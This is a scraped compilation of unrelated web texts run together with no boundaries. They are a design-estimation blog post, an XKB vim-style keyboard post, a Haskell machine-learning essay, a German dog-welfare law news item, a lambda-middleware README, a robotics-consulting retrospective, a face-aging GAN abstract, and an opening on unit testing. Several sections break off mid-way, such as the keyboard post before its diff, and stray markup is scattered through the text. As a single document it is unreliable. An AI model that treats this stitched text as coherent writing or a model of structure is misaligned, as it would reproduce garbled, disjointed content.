<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="7e30365" data-element_type="widget" data-widget_type="raven-post-content.default"><div><p>A few years ago, when I was working for a software development company I wrote an article with some advice on how to estimate software projects. At the time, it was a burning issue in our development team.</p><p>We were getting project inquiries from potential clients and our developers were way off with their time + cost estimates. Can’t blame them, to be honest. Giving the accurate time to complete an entire project, even if the client provides the most detailed specification (which never happens) is extremely difficult.</p><p>Years later, when I moved on to work in design, I eventually bumped into the same situation – getting project inquiries and having to create design estimateions that clients can use to make a decision or budget appropriately. I approached the task thinking it would be a piece of cake compared to software.</p><p>This may be partially true, but it’s definitely not the whole picture.</p><h2><span id="Adjusting_your_internal_process">Adjusting your internal process</span></h2><p>Let’s consider why design estimations are difficult to do. For the most part, it’s because of missing information. On the client’s side, they don’t know how long it takes to create designs and even if they do, they don’t know how much your design team can achieve within a given timeframe.</p><p>On your side (the agency), usually you don’t know the full picture of what your client wants to do and you have no way of knowing what additional features will turn up after you start designing and get a better sense of the scope.</p><p>So, the lack of information is a constant. You’ll always be faced with limited knowledge – no way around that. What you can do instead is to adjust your internal process so this lack of information is not such a huge issue.</p><p>As an example, at Melewi, we work in <a href="https://melewi.net/blog/2016/07/15/whats-design-sprint-work-well/">2-week design sprints</a>. In each sprint, we focus on a specific user flow (e.g. user onboarding, purchase flow, account creation, etc.). When a potential client comes to us, we have a detailed call to understand what they want to build, who they’re building it for, and how the users will be interacting with the product.</p><p>This helps us map the rough amount of user flows and their complexity. From there, we can determine the number of sprints we’ll need to design the product.</p><p>Through the years of creating design estimations and working with clients, we’ve also seen that often times plans change and once a product starts taking shape, clients also start to have a better idea of what they need. This is why we’ve found it easier to keep things flexible and charge clients per sprint, not for an X-month long project.</p><p>That way, we can start with a design scope that takes 4 sprints and add more design sprints as we move along if there are a lot of new features that need to be designed.</p><h2><span id="Leave_yourself_some_wiggle_room">Leave yourself some wiggle room</span></h2><p>Bearing in mind how uncertain design estimations can be, you should always leave some room for revision at a later stage, when you expect to have more information. Be sure to prepare your client that the estimate you’re giving them now might be subject to change, based on what you discover in the future.</p><p>We do this in two steps. First, after we have an initial call with an interested client, we come up with a rough estimate so they can get a feeling of how much time the project will take and what it might cost. Our design process always involves a series of kickoff workshops, before we actually start designing.</p><p> Those workshops are intended to provide us with a ton of additional background information, about the client’s business idea, value proposition, competitive landscape, and user persona. This knowledge will both help our designers when creating the UX &amp; UI, and it will also help us get a better understanding of the scope and any industry-specific features that might take longer to design.</p><p>Naturally, after we’re done with the design workshops we have a much better understanding of the work we need to do. This is the point where we might re-evaluate the estimate we initially provided, if the scope is much larger.</p><h2><span id="What_about_ad-hoc_design">What about ad-hoc design?</span></h2><p>So far, my main point was that your internal process can mitigate some of the issues that come with design estimations. However, that internal process is not universal. If you’re doing <a href="https://melewi.net/ux-design.html">full UX &amp; UI design projects</a> from start to finish and occasional ad-hoc design work, the same process won’t work for both cases. If a client comes to you and needs design for a 10-page brochure for an upcoming conference, they’ll need to know some numbers.</p><p>The good news is you’ll get better at estimating those types of requests with every next project you do. You’ll get a feeling of how much time it takes to come up with the structure, fill it with design elements, add colors, shapes, etc. You’ll also start automatically provisioning some time for back-and-forth communication (which shouldn’t be underestimated).</p><p>Still, if this is not a usual project inquiry for you, consider the lack of knowledge you have now and what information you’ll need to be able to come up with a design estimation.</p><p>First, you’ll need the see the content of the brochure (or whatever you need to design). This will help you understand how much text/images there should be in it and what’s the available space you’ll be working with.</p><p>Second, you’ll need to get some context. What kind of conference is this intended for? Who will be reading this brochure? This will give you some directions on the actual design you need to create – does it have to be something wild and eye-catching, or something more clean and subtle.</p><p>Third, ask them about the deadline. When do they ideally want to have it ready? The estimate doesn’t necessarily have to be X number of hours times your rate per hour. If the client wants to have it ASAP, that’s additional after-work hours and additional stress for you. This has to be compensated accordingly.</p><h2><span id="Conclusion">Conclusion</span></h2><p>Design estimations are hard to do accurately. Whether you need to estimate a UX &amp; UI design project or an ad-hoc design task, 9 times out of 10 you’ll be faced with a lot of uncertainty. Instead of trying to nail the time and cost down to every small detail, create an environment where changing the scope won’t matter that much.</p><p>Keep things flexible and communicate clearly that estimating design projects requires context and background information. Don’t be afraid to ask your clients to do some homework.</p><hr><p>Further reading on estimating UX projects – <a href="https://uxmastery.com/how-to-estimate-a-ux-project/" target="_blank" rel="noopener">https://uxmastery.com/how-to-estimate-a-ux-project</a></p></div></div></div>]]>

<h2 id="insert-mode">Insert Mode<a href="#insert-mode" arialabel="Anchor">⌗</a> </h2>
<p><img src="https://cedaei.com/images/insert_mode.jpg" alt="Insert Mode: A keyboard layout similar to normal QWERTYlayout"></p>
<h2 id="normal-mode">Normal Mode<a href="#normal-mode" arialabel="Anchor">⌗</a> </h2>
<p><img src="https://cedaei.com/images/normal_mode.jpg" alt="Normal Mode: A keyboard layout with the alphabet keys replaced with shortcutkey"></p>
<p>Inspired by vim, I wanted to create a layer on top of my keyboard which worked
like a shortcut layer. So, to start off, I found out about XKB<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. XKB is the
Xorg Keyboard Extension which tells Xorg on how to react to input from
keyboard.  After reading through some source code, I found out that Xorg has
support for function keys F1 - F35<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. The general idea here was:</p>
<ul>
<li>Create an insert mode layout for text input.</li>
<li>Replace keys with relevant keys in normal mode (e.g. replace j with Down) and
for keys that require executing a command, replace then with a function key
above F12 (e.g. replace q with F13).</li>
<li>Bind all the function keys above F12 to the respective functions.</li>
</ul>
<p>To start off, I began a fresh Xorg session with nothing modifying the keys
(removed <code>xmodmap</code> from startup) and first dumped the current layout into a
file.</p>
<div><pre><code data-lang="bash">xkbcomp $DISPLAY ~/.xkb/insert.xkb
</code></pre></div><p>This was my starting point. I made changes to this file which were common to
both Insert and Normal mode. e.g. replaced <code>Caps Lock</code> with <code>Ctrl</code> and made
<code>Shift+Caps Lock</code> <code>Caps Lock</code>. Also, I unbound <code>Alt_R</code> as a modifier so that I
could use that as a switch between Normal and Insert Mode.</p>
<p>Here is a diff between the original layout and Insert mode.</p>
<pre><code>1323c1321
&lt;     key &lt;CAPS&gt; {         [       Caps_Lock ] };
---
&gt;     key &lt;CAPS&gt; {         [       Control_L,       Caps_Lock ] };
1551c1549
&lt;     modifier_map Lock { &lt;CAPS&gt; };
---
&gt;     modifier_map Control { &lt;CAPS&gt; };
1555d1552
&lt;     modifier_map Mod1 { &lt;RALT&gt; };
</code></pre><p>Next, I copied <code>~/.xkb/insert.xkb</code> to <code>~/.xkb/normal.xkb</code>. I replaced keys as
per the plan.</p>
<p>Here is a diff between Insert mode and Normal mode.</p>

        <p>Much advocacy of Haskell, in general, boils down to type-safety and elimination of bugs. How boring. My personal experience is that bugs are trickier in Haskell and I can write bad code in an extraordinary variety of ways.</p>
<p>I don’t code in Haskell to help eliminate bugs. That seems a goal unlikely to produce joy in my code. I write Haskell primarily because in enables me to name things a bit better.</p>
<h2 id="what-is-learning">What is Learning?</h2>
<p>As an example, I came across this quote within the first few pages of a popular online course on machine learning:</p>
<blockquote>
<p>A computer program is said to learn from experience E with respect to some task T and some performance measure P, if its performance on T, as measured by P, improves with experience E. ~ Tom Mitchell</p>
</blockquote>
<p>Here’s how I unpacked this into types:</p>
<div><pre><code data-lang="haskell"><span>-- | learning is to use experience to change the performance of a task.</span>
<span>newtype</span> <span>Learn</span> f e p <span>=</span>
  <span>Learn</span> { change <span>::</span> (<span>Foldable</span> f) <span>=&gt;</span> <span>Experience</span> f e <span>-&gt;</span> <span>Task</span> e p <span>-&gt;</span> <span>Task</span> e p }

</code></pre></div><p>A common approach to newtypes is to label the unwrapping as a reversal of the newtype (such as <code>unlearn</code> or <code>unLearn</code>) but this misses an important naming opportunity: to use a Learn is to change.</p>
<div><pre><code data-lang="haskell"><span>-- | An experience is set of e's</span>
<span>newtype</span> <span>Experience</span> f e <span>=</span> <span>Experience</span> { set <span>::</span> f e }

</code></pre></div><p>This could be thought of (and coded) as an ordinary function with type (e -&gt; p). The advantage of using a newtype, however, is to highlight the two ways that a task can change:</p>
<ul>
<li>changing the way a task is performed (the <code>e</code>).</li>
<li>changing the way a task is measured (the <code>p</code>).</li>
</ul>
<p>Acting on a learning, you can change the way a task is performed, such as changing parameters of a function, or change the way you view what performance is.</p>
<p>To change the way a task is performed, taking experience into account, is to make progress. Progress is made one step at a time.</p>
<div><pre><code data-lang="haskell"><span>-- | To progress, is to transduce a Task, via a carrier</span>
<span>newtype</span> <span>Progress</span> e p <span>=</span> <span>Progress</span> { step <span>::</span> e <span>-&gt;</span> <span>Task</span> e p <span>-&gt;</span> <span>Task</span> e p}
</code></pre></div><p>Putting these above types together in a useful way, to learn, is then to repeatedly apply a progressive step to a set of experiences.</p>
<div><pre><code data-lang="haskell"><span>-- | to learn, is to make Progress from an Experience.</span>
<span>learn</span> <span>::</span> <span>Progress</span> e p <span>-&gt;</span> <span>Learn</span> f e p
<span>learn</span> p <span>=</span> <span>Learn</span> $ <span>\</span>(<span>Experience</span> e) task <span>-&gt;</span> foldr (step p) task e
</code></pre></div><p>To <code>machine learn</code>, we change the way a <code>machine</code> does a task, based on learning, measuring whether performance improves, and adopt the new way to do a task if it does.</p>
<div><pre><code data-lang="haskell"><span>-- | to improve, given a way to change a task by experience, </span>
<span>--</span>
<span>-- you need to choose the better performace way over an experience set.</span>
<span>improve</span> <span>::</span>
  (<span>Ord</span> (f p), <span>Foldable</span> f, <span>Functor</span> f) <span>=&gt;</span>
  <span>Progress</span> e p <span>-&gt;</span>
  <span>Experience</span> f e <span>-&gt;</span>
  <span>Task</span> e p <span>-&gt;</span>
  <span>Task</span> e p
<span>improve</span> progress es task <span>=</span>
  bool task task' (p' &gt; p)
  <span>where</span>
    task' <span>=</span> change (learn progress) es task
    p <span>=</span> measure task &lt;$&gt; set es
    p' <span>=</span> measure task' &lt;$&gt; set es
</code></pre></div><p>The constraints contained in the above code are mostly based on suggestions from ghc to get a compile, and I didn’t think about them much in drafting. Type constraints provide useful guide-rails for future development of these ideas.</p>
<h2 id="machine-learning-in-haskell">Machine Learning in Haskell?</h2>
<p>In the above example of improving we are left with an <code>Ord (f p)</code> constraint - that the performance over an experience set is ordinal. If we narrow the constraint to a <code>Num (f p)</code>, in other words, assume that the size of the <code>f p</code> is meaningful, then we have wandered in to the traditional numerical methods domain, and can, for example, start to think about gradients to speed up our improvement.</p>
<p>By insisting on useful and concrete names (aka types), Haskell supplies a constrained domain we can further explore.  For example, are there machine learning examples that don’t fit the candidate types and constraints?</p>
<p>Naming things is hard, and other ways of coding tend to avoid the task. Types bring me joy and I shall keep them, thank you very much, and continue to curate collections of them, for fun and profit. In this example, I now have as good a definition of machine learning as you’ll find out in the wild, and my progress on machine learning will be more comprehensive, faster and safer than bashing away in python.</p>
<p>And yet, to a first degree, machine learning in Haskell does not exist, swamped by the easiness of dynamic types. If the promises being made by ML are to be eventually honoured, however, it may need less code bashing and better naming.</p>

        <!--?xml version="1.0" encoding="UTF-8"?--><p>In future, a dog’s right to exercise could be enshrined in German law. That’s if a new draft ordinance issued by the Federal Ministry of Agriculture is passed. The law also seeks to improve conditions during the transportation of farm animals.</p><h2>New rules for dog owners, breeders and farm animals in Germany</h2><p>According to the draft regulation, which was seen by the German newspaper Rheinische Post, in future dog owners will have to ensure that their animals are walked at least twice a day, for a total of one hour. They will no longer be permitted to leave their dogs home alone all day or keep them chained up outside; a carer will need to check in on the animal “several times a day”.</p><p>Further rules will also apply specifically to dog breeders. The draft law stipulates that breeders be allowed to look after no more than three bitches with puppies at the same time. There will also be new regulations regarding the size and temperature of whelping boxes.&nbsp;</p><p>Shows with dogs that have been overbred to such an extent that they are in pain or no longer able to “behave appropriately” will be banned, as will those featuring animals whose body parts (such as ears or tail) have been “completely or partially amputated” in a manner contrary to animal welfare.&nbsp;</p><p>For farm animals, the new law stipulates that livestock transports within Germany may not exceed four and a half hours if the animals are directly exposed to temperatures of more than 30 degrees.</p><h2>Animals need movement and environmental stimuli</h2><p>The draft law cites “new scientific knowledge about the needs of dogs” as a justification for the stricter rules. Accordingly, animals should be given “a sufficient degree of movement and contact with environmental stimuli.” Federal Agriculture Minister Julia Klöckner said, “<a href="https://www.iamexpat.de/lifestyle/pets-information-germany">Pets</a> are not cuddly toys.”</p><p>When asked how the new laws will be enforced, especially for private dog owners, a spokesperson for the Agriculture Ministry said that the federal states would be responsible - but that they certainly wouldn’t be ringing the doorbell of every dog owner to check up on them. The law is primarily targeting those who keep their dogs outside in kennels. The draft now needs to be coordinated with the 16 federal states and professional associations.&nbsp;</p>

</ul>

<h2 id="other-packages">Other packages</h2>

<p>Furthermore there is utility collection available at <a href="https://dbartholomae.github.io/packages/utils">@lambda-middleware/utils</a>.</p>

<h2 id="usage">Usage</h2>

<p>Each middleware is a higher-order function that can be wrapped around the handler function.</p>

<div><div><pre><code><span>export</span> <span>const</span> <span>handler</span> <span>=</span> <span>someMiddleware</span><span>()(()</span> <span>=&gt;</span> <span>{</span>
  <span>return</span> <span>{</span>
    <span>body</span><span>:</span> <span>''</span><span>,</span>
    <span>statusCode</span><span>:</span> <span>200</span>
  <span>}</span>
<span>})</span>
</code></pre></div></div>

<p>Each middleware is build as</p>
<div><div><pre><code><span>(</span><span>options</span><span>)</span> <span>=&gt;</span> <span>(</span><span>handler</span><span>)</span> <span>=&gt;</span> <span>(</span><span>event</span><span>,</span> <span>context</span><span>)</span> <span>=&gt;</span> <span>Response</span>
</code></pre></div></div>

<p>This means that middleware can be composed and piped like any other function with only one parameter (the handler).
This library contains <a href="https://dbartholomae.github.io/lambda-middleware/packages/compose">a helper for composing</a>, but <a href="https://lodash.com/docs/4.17.15#flowRight">any</a>
<a href="https://ramdajs.com/docs/#compose">other</a> <a href="https://github.com/tc39/proposal-pipeline-operator">implementation</a> should
work as well.</p>

<div><div><pre><code><span>export</span> <span>const</span> <span>handler</span> <span>=</span> <span>compose</span><span>(</span>
  <span>someMiddleware</span><span>(),</span>
  <span>someOtherMiddleware</span><span>(),</span>
  <span>aThirdMiddleware</span><span>()</span>
<span>)(()</span> <span>=&gt;</span> <span>{</span>
  <span>return</span> <span>{</span>
    <span>body</span><span>:</span> <span>''</span><span>,</span>
    <span>statusCode</span><span>:</span> <span>200</span>
  <span>}</span>
<span>})</span>
</code></pre></div></div>

<p>Composing middleware is equivalent to calling it nested:</p>
<div><div><pre><code><span>export</span> <span>const</span> <span>handler</span> <span>=</span>
  <span>someMiddleware</span><span>()(</span>
    <span>someOtherMiddleware</span><span>()(</span>
      <span>aThirdMiddleware</span><span>()(()</span> <span>=&gt;</span> <span>{</span>
        <span>return</span> <span>{</span>
          <span>body</span><span>:</span> <span>''</span><span>,</span>
          <span>statusCode</span><span>:</span> <span>200</span>
        <span>}</span>
      <span>})</span>
    <span>)</span>
  <span>)</span>
</code></pre></div></div>

<p>The order of composition can be relevant. When using a helper to do the composition, check, in which order the functions
are applied. Most of the time TypeScript should be able to warn you, if the order is wrong.</p>

<p>Imagine middleware as an onion around your function: The outermost middleware will get called first before the handler
starts, and last after the handler finishes or throws an error. In our example above the order in which middleware gets
executed therefore would be:</p>
<div><div><pre><code>someMiddleware
  someOtherMiddleware
    aThirdMiddleware
      the handler
    aThirdMiddleware
  someOtherMiddleware
someMiddleware
</code></pre></div></div>
<p>This means that middleware which transforms the input for the handler will be executed top to bottom, while middleware
that transforms the response will be called bottom to top.</p>

<h2 id="writing-your-own-middleware">Writing your own middleware</h2>

<p>If you want to write your own middleware, check the existing examples and feel free to borrow some of the tests for
inspiration. The general idea for a middleware is the following:</p>
<div><div><pre><code><span>const</span> <span>myMiddleware</span> <span>=</span> <span>(</span><span>optionsForMyMiddleware</span><span>)</span> <span>=&gt;</span> <span>(</span><span>handler</span><span>)</span> <span>=&gt;</span> <span>async</span> <span>(</span><span>event</span><span>,</span> <span>context</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>try</span> <span>{</span>
    <span>const</span> <span>modifiedEvent</span> <span>=</span> <span>doSomethingBeforeCallingTheHandler</span><span>(</span><span>event</span><span>)</span>
    <span>const</span> <span>response</span> <span>=</span> <span>await</span> <span>handler</span><span>(</span><span>modifiedEvent</span><span>,</span> <span>context</span><span>)</span>
    <span>const</span> <span>modifiedResponse</span> <span>=</span> <span>doSomethingAfterCallingTheHandler</span><span>(</span><span>response</span><span>)</span>
    <span>return</span> <span>modifiedResponse</span>
  <span>}</span> <span>catch</span> <span>(</span><span>error</span><span>)</span> <span>{</span>
    <span>const</span> <span>modifiedError</span> <span>=</span> <span>doSomethingInCaseOfAnError</span><span>(</span><span>error</span><span>)</span>
    <span>throw</span> <span>modifiedError</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>
<p>Usually the same middleware should not need to do something before the handler, after the handler and on error.
Creating separated middlewares for these cases keeps them more versatile. But cases that require multiple steps are
supported as well.</p>

<p>Since the middlewares only uses function composition, TypeScript can offer extensive typing support to let you know
how the middleware changed. When adding your own middleware it is recommended to use generics to avoid losing type
information.</p>

<p>Instead of</p>
<div><div><pre><code><span>const</span> <span>bodyParser</span> <span>=</span> <span>()</span> <span>=&gt;</span>
  <span>(</span><span>handler</span><span>:</span> <span>PromiseHandler</span><span>&lt;</span><span>Omit</span><span>&lt;</span><span>APIGatewayProxyEvent</span><span>,</span> <span>body</span><span>&gt;</span> <span>&amp;</span> <span>{</span> <span>body</span><span>:</span> <span>object</span><span>},</span> <span>APIGatewayProxyResult</span><span>&gt;</span><span>):</span> <span>PromiseHandler</span><span>&lt;</span><span>APIGatewayProxyEvent</span><span>,</span> <span>APIGatewayProxyResult</span><span>&gt;</span> <span>=&gt;</span>
  <span>async</span> <span>(</span><span>event</span><span>:</span> <span>E</span><span>,</span> <span>context</span><span>:</span> <span>Context</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>return</span> <span>handler</span><span>({</span> <span>...</span><span>event</span><span>,</span> <span>body</span><span>:</span> <span>JSON</span><span>.</span><span>parse</span><span>(</span><span>event</span><span>.</span><span>body</span><span>)</span> <span>},</span> <span>context</span><span>)</span>
<span>}</span>
</code></pre></div></div>
<p>use</p>
<div><div><pre><code><span>const</span> <span>bodyParser</span> <span>=</span> <span>()</span> <span>=&gt;</span>
  <span>&lt;</span><span>E</span> <span>extends</span> <span>APIGatewayProxyEvent</span><span>&gt;</span><span>(</span><span>handler</span><span>:</span> <span>PromiseHandler</span><span>&lt;</span><span>Omit</span><span>&lt;</span><span>E</span><span>,</span> <span>body</span><span>&gt;</span> <span>&amp;</span> <span>{</span> <span>body</span><span>:</span> <span>object</span><span>},</span> <span>APIGatewayProxyResult</span><span>&gt;</span><span>):</span> <span>PromiseHandler</span><span>&lt;</span><span>E</span><span>,</span> <span>APIGatewayProxyResult</span><span>&gt;</span> <span>=&gt;</span>
  <span>async</span> <span>(</span><span>event</span><span>:</span> <span>E</span><span>,</span> <span>context</span><span>:</span> <span>Context</span><span>)</span> <span>=&gt;</span> <span>{</span>

<span>}</span>
</code></pre></div></div>
<p>so that if multiple middlewares change the event, the resulting type will have all changes and not just the latest.</p>

            </p>
        
      
      <p>It’s that time of year again when I’m thinking back on the journey I set up for myself by deciding to go into Robotics Consulting. This article is a follow up to the blog post I wrote <a href="https://msadowski.github.io/one-year-of-robotics-consulting/">last year</a>. This year, I’ve decided to try and cover the most important aspects of what I’m doing, and how it has been working out for me.</p>

<!-- more -->

<h2 id="the-work-i-had">The work I had</h2>

<p>I’m very grateful for the kind of work that I do - it feels amazing doing what I love and getting paid for it. I would never change my work for anything else. Every single one of my clients has an interesting problem to solve, and I’m yet to get my first negative experience working with someone. Looking back on all my clients, I’ve worked with many interesting people all around the world, mostly helping them to develop software for mobile robots and drones.</p>

    <figcaption>A world map of the 22 clients I've worked with over the past 2 years</figcaption>
</figure>

<figure>
    <img src="https://msadowski.github.io/images/2_yr_consulting/clients_europe.png" alt="Image showing 8 of my clients in Europe">
    <figcaption>My European clients</figcaption>
</figure>

<p>The duration of the projects I take on are between half a day and 2.5 years long. Everything depends on the client and what they require. Most of my projects kick off with a consultation - helping the client to solve a particular problem by sharing my expertise and experience. After this initial phase, some of the clients decide to hire me as a contractor, helping their technical team solve the challenges they face, while others are happy to carry on working by themselves with the advice received.</p>

<p>As a tangent to the consultations, I also help evaluate robotics funding proposals, as a reviewer in EU technological funding projects <a href="http://www.esmera-project.eu/welcome/">ESMERA</a> and <a href="https://trinityrobotics.eu/">TRINITY</a>, making sure your tax euros are spent on truly cutting-edge projects.</p>

<h3 id="putting-myself-in-my-clients-shoes">Putting myself in my clients’ shoes</h3>

<p>Every project I take on, I treat as my own. This results in me trying to solve issues before they happen, and sometimes even pushing back on client’s decisions - “How about we don’t remove this safety feature?”. Another side effect of treating the project as my own is that I put the client first, before my own business interest, meaning I might earn less for the project overall.</p>

<p>As an example, I was hired to test the idea a client had for a robotic project. The idea turned out to be borderline feasible, with currently available technology, but potentially requiring lots of R&amp;D work. If I sold the project as “no problem, it’s totally doable”, I would definitely get more work supporting the R&amp;D work required. By putting the project and client’s interests first, however, we finished the project after the feasibility study, having realised the extent of R&amp;D work needed.</p>

<p>Since terminating such a project before going to an R&amp;D phase is something I would do, I’m content and the client is most likely even more so, since they don’t have to spend lots of money, not understanding the R&amp;D effort required. Instead, they can decide whether to pursue the idea further. If the client does decide to take a risk, they know that I’ll be there, ready to treat their project as my own, and providing honest advice, even if it means I get less work from it.</p>

<h3 id="the-hardware">The hardware</h3>

<p>Working with hardware is one of the most enjoyable parts of my job. This year, I’ve been focusing a lot on RTK solutions (I have one blog post in the works on a neat RTK setup). Also this year, I finally got my hands on a multi-plane LiDAR, something I’ve been very keen on ever since Velodyne revealed their first multi-plane units.</p>

<h2 id="the-work-i-did-not-win">The Work I Did Not Win</h2>

<h3 id="the-dream-project">The dream project</h3>

<p>At one point, I was approached by a client who wanted to create a certain type of robot that I’ve always dreamt of working with. The task would require me to liaise with manufacturers and developers to get the robot ready, and enable support for autonomous navigation in various terrain types. In short, a hugely challenging project that would immensely help me grow, whilst being super fun at the same time. When discussing the project in more detail, I noticed that the budget for this client was not an issue - any platform for any price was OK, as long as it met the requirements. However, when asking follow up questions, it became clear that the project target was to equip robots with weapons.</p>

</figcaption>
</figure>

<p>When I was applying to University, I promised myself I would not work on weapons, even if these projects have a virtually unlimited budget. I figured that even if I was to fold my consultancy, I would rather do that than compromise on my values.</p>

<h3 id="the-bargain">The bargain</h3>

<p>In the two years working as a Robotics Consultant, I’ve noticed a pattern: the more a potential client bargains before starting the job, the more bargaining and complaining will follow, resulting in an unpleasant experience for everyone involved. In the same bucket as bargaining clients are the UpWork projects that want you to create a SLAM library from scratch for a fixed price of $50. These days, I tend to reject these types of clients and contracts straight away, saving everyone’s time.</p>

<h3 id="watch-out-for-the-legal-stuff">Watch out for the legal stuff</h3>

<p>If I’m receiving 25 pages of legal documents to review before engaging with a customer, it’s a  potential red flag. I don’t mind reading legal documents, but I would rather not involve a lawyer before even starting a project. For me, a huge red flag is when a potential client adds a very vaguely described 3-year non-compete clause, covering a whole industry. I find such terms too restrictive and would never take a project on like this, unless the project also paid for a 3 year holiday after wrapping everything up!</p>

<h3 id="the-lack-of-expertise">The lack of expertise</h3>

<p>As much as I would love to know everything about Robotics, it’s not likely to happen anytime soon. I will never take on projects that fall outside of my expertise (for example, algorithms for soft robotics), unless the client is persistent and understands an R&amp;D process. My go-to advice in such cases is that it’s not feasible to pay my high rates for me to catch up on the topic. In a hypothetical situation, if the project falls outside of my expertise, but it’s in an area I’m planning to pursue, I’d offer a very low rate for the project, highlighting that I will need to do some catching up.</p>

<h2 id="remote-robotics">Remote Robotics</h2>

<p>People often ask me how I work on robotics projects remotely (I’ve been doing this since day 1 of my consultancy). When I’m doing some high level work, it’s usually not an issue. It only becomes slightly more problematic with hardware-oriented projects. The options I’ve tested so far are:</p>

<ul>
  <li>For ROS systems, working with bag files, and in the case of drones, working with log files</li>
  <li>Clients shipping the hardware to me</li>
  <li>Travelling to the client’s location</li>
  <li>Remote control</li>
</ul>

<figure>
    <img src="https://msadowski.github.io/images/2_yr_consulting/office.jpg" alt="My office in the times of pandemic">
    <figcaption>Me and my partner's office in the time of the COVID-19 pandemic</figcaption>
</figure>

<p>ROS is absolutely the best thing that happened to people like me - I can easily review things online and even develop software with just <a href="http://wiki.ros.org/rosbag">bagfiles</a>. However, it’s not always feasible to work with bags, especially if you need to do some work related to sensors and actuators. In these cases, clients will often ship their hardware to me, so that I can integrate it locally. A very convenient way to work with clients in this way is to use a temporary import - it saves you the risk of paying taxes and duties for the expensive robotics parts, and as far as I know when doing a temporary import, you can keep the items for up to a year.</p>

<p>Travelling to the client’s location usually results in a couple of days of a hackathon solving issue. I love these, as it allows me to put the faces to Slack usernames, and I like the dynamics of these kinds of projects. On the flip side, the last time I did it, I ended up doing about 60 hours of work in 5 days - not very feasible, especially as you need to rest for a couple of days afterwards, but I would do it again!</p>

<p>Remote control of the client’s desktop is something that I try to avoid as much as possible when working with hardware. I find that not having physical access to the components is often very limiting (“can you please unplug the cable for me?”) and I estimate that in the worst cases, you are 20-40% less productive by working on robotics in this way.</p>

<h2 id="other-thoughts-on-consultancy-and-self-employment">Other Thoughts on Consultancy and Self-Employment</h2>

<h3 id="freedom">Freedom</h3>

<p>Freedom is one of the most important aspects of what I do. If I don’t work with hardware for a project, then I can usually work from whatever place I want. If I have a day when I don’t feel like working, or can’t work, then taking a day off is not an issue. To an extent, I can choose whichever projects to work on (or at least to which I can say “no” to).</p>

<figure>
    <img src="https://msadowski.github.io/images/2_yr_consulting/outdoors.jpg" alt="A mountain view">
    <figcaption>Having a possibility to go out into the mountains in the middle of the week is something I appreciate a lot</figcaption>
</figure>

<p>This freedom, however, comes with a price attached to it - if I’m not working, then I’m not making money. I don’t get bank holidays and if I get sick and can’t work, then I’m not earning either. These are the main reasons why I think working for oneself is not for everybody, especially when having no projects lined up, as it can become quite stressful.</p>

<p>Being self-employed means that you are at the centre of your business. For me, this means that my physical and mental health are my number one priorities. Examples of how I exercise these are:</p>
<ul>
  <li>Three times a week, around 4pm, I do sports (normally, I go to the gym, but during the pandemic, I’ve been going for a run)</li>
  <li>Practising meditation as the first thing I do in the morning</li>
  <li>In case of health issues, I look to fix them without thinking twice about the money (being located in Europe is a huge advantage here as I know no doctor’s visit will ruin me, financially)</li>
</ul>

<h3 id="upwork">Upwork</h3>

<p>Over the past year, most of my work has come from Upwork (you can see my profile <a href="https://www.upwork.com/freelancers/~0196b3ccb97605e632">here</a>). I won’t repeat the things I said <a href="https://msadowski.github.io/one-year-of-robotics-consulting/#upwork">last year</a> - I’ve grown to appreciate the service. I realised that the 20% fee for …</p></div></div>

<h2 id="abstract">Abstract</h2>
<p>Existing approaches and datasets for face aging produce results skewed towards the mean, with individual variations and expression wrinkles often invisible or overlooked in favor of global patterns such as the fattening of the face. Moreover, they offer little to no control over the way the faces are aged and can difficultly be scaled to large images, thus preventing their usage in many real-world applications. To address these limitations, we present an approach to change the appearance of a high-resolution image using ethnicity-specific aging information and weak spatial supervision to guide the aging process. We demonstrate the advantage of our proposed method in terms of quality, control, and how it can be used on high-definition images while limiting the computational overhead.</p>

<h2 id="model">Model</h2>
<p>Our model takes a patch <em>p</em> from the input image <em>I</em>, a target aging map <em>A</em>, and two orthonogal gradient images <em>X</em> and <em>Y</em>. The image patch <em>I<sub>p</sub></em> is then transformed according to the local aging information contained in the map <em>A<sub>p</sub></em>, while the orthogonal gradients <em>X<sub>p</sub></em> and <em>Y<sub>p</sub></em> provide the coordinates of the patch in a fully-convolutional manner. The conditions are injected in the generator via the SPADE block to preserve the spatial information. Finally, the generator uses an attention mechanism to only change relevant parts of the image, thus preserving the clothes, earrings and other facial features unrelated to aging.</p>

  <img width="70%" src="https://despoisj.github.io/AgingMapGAN/img/model_hd.jpg">
</p>

<h2 id="training">Training</h2>
<p>To train our model, we use four different losses: <em>L<sub>Age</sub></em> to penalize the aging map estimation, <em>L<sub>Loc</sub></em> for the patch localization, <em>L<sub>WGAN</sub></em> for the realism of the generated images, and <em>L<sub>Cyc</sub></em> for the fidelity to the original image.</p>

<p>We have labeled 7000 images, using 15 clinical aging signs for each image, in order to build accurate ethnicity-specific aging maps for each individual. On this dataset, our model is able to generate aged and rejuvenated faces with complete control over the localization and amount of aging.</p>

The best part of going through a proper low fidelity design process is that it reduces the probability of error that can take place in the development cycle.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1598260527724/vTQ2VswEq.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>In software engineering space, we often face a situation where we developers, demand for full app revamp for numerous reasons. The codebase becomes fragile. More regression bugs popping up after every release. It takes a long time to add new features and even to resolve small bugs. Everyone is afraid of making changes to the giant beast classes. While revamping looks like a viable option in the developer's eyes, the businesses cannot hold on to building new features. Sometimes, it is impossible to afford regressions in the existing features since the customers are already used to the product.</p>
<p>Now, Is it possible to revamp once in every two or three years? The very obvious answer is a big NO! Now, what exactly went wrong? It could be the Bad software design,</p>
<ul>
<li>Giant beast classes</li>
<li>Modules are tightly coupled</li>
<li>No unit tests</li>
</ul>
<h3 id="no-unit-tests">No unit tests</h3>
<p>In this article, we are going to see only the consequences of not having unit tests and how we can prepare ourselves to write our first unit test. If you see, we might not face any of these problems while starting a new project from scratch. Everyone loves to work on a new project. As your application grows, your confidence level starts to dip down and you might not able to ship features as fast as you were. The codebase is becoming legacy very quickly without tests.</p>
<blockquote>
